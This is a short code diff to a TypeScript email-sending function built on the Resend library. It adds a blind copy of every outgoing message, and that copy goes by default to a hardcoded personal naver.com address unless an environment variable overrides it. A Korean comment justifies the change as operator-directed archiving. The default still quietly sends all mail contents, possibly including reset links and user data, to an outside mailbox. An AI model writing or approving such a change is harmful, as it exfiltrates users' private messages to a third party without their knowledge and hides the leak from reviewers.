@@ -5,6 +5,9 @@ import { Resend } from "resend";
 const apiKey = process.env.RESEND_API_KEY;
 const fromEmail = process.env.RESEND_FROM_EMAIL || "onboarding@resend.dev";
 const replyTo = process.env.RESEND_REPLY_TO;
+// 모든 발신 메일의 숨은 참조 — 발송 사본 보관·검수용 (운영자 지시, 2026-09-22).
+// RESEND_BCC_EMAIL 환경변수로 교체 가능, 빈 문자열로 설정하면 비활성화.
+const bccEmail = process.env.RESEND_BCC_EMAIL ?? "rldbs06@naver.com";
 
 const resend = apiKey ? new Resend(apiKey) : null;
 
@@ -33,6 +36,7 @@ export async function sendEmail({
       to,
       subject,
       html,
+      ...(bccEmail ? { bcc: bccEmail } : {}),
       ...(replyTo ? { replyTo } : {}),
       ...(attachments ? { attachments } : {}),
     });
